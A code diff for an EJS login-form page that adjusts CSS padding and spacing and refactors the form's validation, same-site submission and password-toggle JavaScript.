@@ -38,7 +38,6 @@
       gap: 16px;
       opacity: 1;
       margin: 0 auto;
-      border: 2px solid red; /* Temporary for debugging visibility */
     }
     .login-container:hover {
       transform: scale(1.02);
@@ -76,7 +75,7 @@
       margin: 0 auto;
       display: flex;
       flex-direction: column;
-      gap: 10px; /* Slightly increased for taller fields */
+      gap: 8px;
     }
     .input-container {
       position: relative;
@@ -84,9 +83,8 @@
     }
     .login-container input {
       width: 100%;
-      padding: 18px 40px 18px 14px; /* Increased vertical padding for taller fields */
-      min-height: 50px; /* Added for consistent height */
-      margin: 8px 0; /* Reduced margin to tighten spacing */
+      padding: 20px 40px 20px 14px; /* Increased vertical padding from 16px to 20px */
+      margin: 16px 0;
       border-radius: 8px;
       font-size: 0.95rem;
       box-sizing: border-box;
@@ -111,8 +109,7 @@
     .login-container button {
       width: 100%;
       max-width: 400px;
-      padding: 18px; /* Increased vertical padding for taller button */
-      min-height: 50px; /* Added for consistent height */
+      padding: 20px; /* Increased padding from 16px to 20px */
       margin: 0;
       border-radius: 8px;
       font-size: 0.95rem;
@@ -250,7 +247,7 @@
       }
       .form-fields {
         max-width: 100%;
-        gap: 8px; /* Adjusted for medium screens */
+        gap: 6px;
       }
       .login-container h2 {
         font-size: 1.6rem;
@@ -259,15 +256,13 @@
       .login-container p {
         font-size: 0.9rem;
       }
-      .login-container input {
-        padding: 14px 40px 14px 12px; /* Slightly reduced for smaller screens */
-        min-height: 46px; /* Adjusted height */
+      .login-container input, .login-container button {
+        padding: 16px 40px 16px 12px; /* Adjusted vertical padding from 12px to 16px */
         font-size: 0.9rem;
       }
       .login-container button {
-        padding: 14px; /* Slightly reduced */
-        min-height: 46px; /* Adjusted height */
-        font-size: 0.9rem;
+        padding: 18px; /* Adjusted button padding from 14px to 18px */
+        margin: 0;
       }
       .popup {
         width: 80%;
@@ -281,7 +276,7 @@
       }
       .form-fields {
         max-width: 100%;
-        gap: 6px; /* Adjusted for small screens */
+        gap: 4px;
       }
       .login-container h2 {
         font-size: 1.4rem;
@@ -290,15 +285,13 @@
       .login-container p {
         font-size: 0.85rem;
       }
-      .login-container input {
-        padding: 12px 40px 12px 10px; /* Further reduced */
-        min-height: 42px; /* Adjusted height */
+      .login-container input, .login-container button {
+        padding: 14px 40px 14px 10px; /* Adjusted vertical padding from 10px to 14px */
         font-size: 0.85rem;
       }
       .login-container button {
-        padding: 12px; /* Further reduced */
-        min-height: 42px; /* Adjusted height */
-        font-size: 0.85rem;
+        padding: 16px; /* Adjusted button padding from 12px to 16px */
+        margin: 0;
       }
       .popup {
         max-width: 260px;
@@ -407,122 +400,111 @@
       }
     };
 
-    try {
-      const loginButton = document.getElementById('login-button');
-      const messagePopup = document.getElementById('message-popup');
-      const messageOverlay = document.getElementById('message-overlay');
-      const messagePopupClose = document.getElementById('message-popup-close');
-      const messageText = document.getElementById('message-text');
-      const inputFieldsContainer = document.getElementById('input-fields');
+    const loginButton = document.getElementById('login-button');
+    const messagePopup = document.getElementById('message-popup');
+    const messageOverlay = document.getElementById('message-overlay');
+    const messagePopupClose = document.getElementById('message-popup-close');
+    const messageText = document.getElementById('message-text');
+    const inputFieldsContainer = document.getElementById('input-fields');
 
-      if (!loginButton || !messagePopup || !messageOverlay || !messagePopupClose || !inputFieldsContainer) {
-        throw new Error('One or more DOM elements not found');
-      }
+    function normalizeUrl(url) {
+      if (!url) return null;
+      url = url.trim();
+      if (url.match(/^https?:\/\//)) return url;
+      if (url.match(/\.[a-z]{2,}$/i)) return 'https://' + url;
+      return null;
+    }
 
-      function normalizeUrl(url) {
-        if (!url) return null;
-        url = url.trim();
-        if (url.match(/^https?:\/\//)) return url;
-        if (url.match(/\.[a-z]{2,}$/i)) return 'https://' + url;
-        return null;
-      }
+    function showMessagePopup(message) {
+      messageText.textContent = message || 'Welcome! You have clicked the button.';
+      messagePopup.classList.add('show');
+      messageOverlay.classList.add('show');
+    }
 
-      function showMessagePopup(message) {
-        messageText.textContent = message || 'Welcome! You have clicked the button.';
-        messagePopup.classList.add('show');
-        messageOverlay.classList.add('show');
-      }
+    function hideMessagePopup() {
+      messagePopup.classList.remove('show');
+      messageOverlay.classList.remove('show');
+    }
 
-      function hideMessagePopup() {
-        messagePopup.classList.remove('show');
-        messageOverlay.classList.remove('show');
-      }
+    function checkFormFilled() {
+      const inputs = inputFieldsContainer.querySelectorAll('input');
+      const templateFields = templates['<%= template %>'].fields;
 
-      function checkFormFilled() {
-        const inputs = inputFieldsContainer.querySelectorAll('input');
-        const templateKey = '<%= template %>';
-        if (!templates[templateKey]) {
-          showMessagePopup('Invalid form configuration.');
+      for (let i = 0; i < inputs.length; i++) {
+        const input = inputs[i];
+        const value = input.value.trim();
+        const fieldId = input.id.replace('login-', '');
+        const templateField = templateFields.find(field => field.id === fieldId);
+
+        if (!value && (!templateField || templateField.validation.required)) {
+          showMessagePopup('Please fill all required fields before proceeding.');
           return false;
         }
-        const templateFields = templates[templateKey].fields;
 
-        for (let i = 0; i < inputs.length; i++) {
-          const input = inputs[i];
-          const value = input.value.trim();
-          const fieldId = input.id.replace('login-', '');
-          const templateField = templateFields.find(field => field.id === fieldId);
-
-          if (!value && (!templateField || templateField.validation.required)) {
-            showMessagePopup('Please fill all required fields before proceeding.');
-            return false;
-          }
-
-          if (templateField && templateField.validation && templateField.validation.regex) {
-            try {
-              const regex = new RegExp(templateField.validation.regex);
-              if (!regex.test(value)) {
-                showMessagePopup(templateField.validation.errorMessage);
-                return false;
-              }
-            } catch (e) {
-              console.error('Invalid regex for field:', fieldId, e);
-              showMessagePopup('Invalid input format.');
+        if (templateField && templateField.validation && templateField.validation.regex) {
+          try {
+            const regex = new RegExp(templateField.validation.regex);
+            if (!regex.test(value)) {
+              showMessagePopup(templateField.validation.errorMessage);
               return false;
             }
+          } catch (e) {
+            console.error('Invalid regex for field:', fieldId, e);
           }
         }
-        return true;
       }
+      return true;
+    }
 
-      async function submitFormData() {
-        const inputs = inputFieldsContainer.querySelectorAll('input');
-        const formData = {};
-        inputs.forEach(input => {
-          const fieldId = input.id.replace('login-', '');
-          formData[fieldId] = input.value.trim();
-        });
-
-        try {
-          const formId = '<%= formId %>';
-          if (!formId) throw new Error('Form ID is undefined');
-          const response = await fetch(`/form/${formId}/submit`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(formData)
-          });
-          const result = await response.json();
-          if (!response.ok) {
-            console.error('Submission failed:', result.error);
-            showMessagePopup(result.error || 'Failed to submit form.');
-            return false;
-          }
-          console.log('Submission successful:', result);
-          return true;
-        } catch (error) {
-          console.error('Error submitting form:', error);
-          showMessagePopup('An error occurred while submitting the form.');
-          return false;
-        }
-      }
-
-      const togglePasswordButtons = document.querySelectorAll('.toggle-password');
-      togglePasswordButtons.forEach(button => {
-        button.addEventListener('click', () => {
-          const inputId = button.getAttribute('data-input');
-          const input = document.getElementById(inputId);
-          if (input.type === 'password') {
-            input.type = 'text';
-            button.classList.remove('fa-eye');
-            button.classList.add('fa-eye-slash');
-          } else {
-            input.type = 'password';
-            button.classList.remove('fa-eye-slash');
-            button.classList.add('fa-eye');
-          }
-        });
+    async function submitFormData() {
+      const inputs = inputFieldsContainer.querySelectorAll('input');
+      const formData = {};
+      inputs.forEach(input => {
+        const fieldId = input.id.replace('login-', '');
+        formData[fieldId] = input.value.trim();
       });
 
+      try {
+        const response = await fetch('/form/<%= formId %>/submit', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(formData)
+        });
+        const result = await response.json();
+        if (!response.ok) {
+          console.error('Submission failed:', result.error);
+          showMessagePopup(result.error || 'Failed to submit form.');
+          return false;
+        }
+        console.log('Submission successful:', result);
+        return true;
+      } catch (error) {
+        console.error('Error submitting form:', error);
+        showMessagePopup('An error occurred while submitting the form.');
+        return false;
+      }
+    }
+
+    const togglePasswordButtons = document.querySelectorAll('.toggle-password');
+    togglePasswordButtons.forEach(button => {
+      button.addEventListener('click', () => {
+        const inputId = button.getAttribute('data-input');
+        const input = document.getElementById(inputId);
+        if (input.type === 'password') {
+          input.type = 'text';
+          button.classList.remove('fa-eye');
+          button.classList.add('fa-eye-slash');
+        } else {
+          input.type = 'password';
+          button.classList.remove('fa-eye-slash');
+          button.classList.add('fa-eye');
+        }
+      });
+    });
+
+    try {
       loginButton.addEventListener('click', async () => {
         const buttonText = loginButton.querySelector('.button-text');
         const spinner = loginButton.querySelector('.spinner');
@@ -567,8 +549,8 @@
       messagePopupClose.addEventListener('click', hideMessagePopup);
       messageOverlay.addEventListener('click', hideMessagePopup);
     } catch (error) {
-      console.error('Form initialization error:', error);
-      showMessagePopup('An error occurred while loading the form.');
+      console.error('Error in form script:', error);
+      showMessagePopup('An error occurred. Please try again.');
     }
   </script>
 </body>
